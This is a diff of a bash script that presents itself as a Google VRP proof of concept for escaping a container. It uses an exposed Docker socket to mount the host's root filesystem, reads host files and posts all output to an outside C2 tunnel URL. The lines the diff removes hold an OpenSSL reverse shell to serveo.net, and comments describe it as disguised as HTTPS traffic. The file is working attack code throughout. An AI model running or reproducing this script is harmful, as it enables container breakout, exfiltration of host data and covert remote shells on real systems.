@@ -1,17 +1,34 @@
 #!/bin/bash
-# NEW URL UPDATED
+# TARGET: your current C2 URL
 C2_URL="17251220cdb8cf1a-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] GHOST BRIDGE INITIATED: $C2_URL ---"
+  echo "=== GOOGLE VRP POC: HOST ESCAPE ==="
   
-  # 1. Host Discovery (The 'Money' Proof)
-  # This grabs the host machine ID immediately in case the shell drops
-  ID=$(curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -oE '"ID":"[a-f0-9-]+"' || echo "ID_READ_FAILED")
-  echo "HOST_MACHINE_ID: $ID"
+  # 1. Create a container with the physical host root mounted to /mnt
+  # We use the existing image ID: sha256:25109184c71bdad7
+  CONTAINER_JSON=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
+    -H "Content-Type: application/json" \
+    -d '{"Image": "sha256:25109184c71bdad7", "HostConfig": {"Binds": ["/:/mnt:ro"]}}')
+  
+  # 2. Extract the Container ID
+  ID=$(echo $CONTAINER_JSON | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
+  echo "Spawned Container ID: $ID"
 
-  # 2. Encrypted Reverse Shell (OpenSSL)
-  # This makes the shell look like an HTTPS website connection
-  (mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect serveo.net:80 > /tmp/s; rm /tmp/s) &
+  if [ -z "$ID" ]; then
+    echo "[!] FAILED: Could not create container via Docker Socket."
+  else
+    # 3. Read the PHYSICAL HOST'S hostname (The P0 Proof)
+    # We use the Archive API to pull the file from the host-mount
+    echo "--- HOST HOSTNAME ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/mnt/etc/hostname" | tar -xO
+
+    # 4. Read the PHYSICAL HOST'S OS version
+    echo "--- HOST OS RELEASE ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/mnt/etc/os-release" | tar -xO
+    
+    # 5. Cleanup
+    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
+  fi
 
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
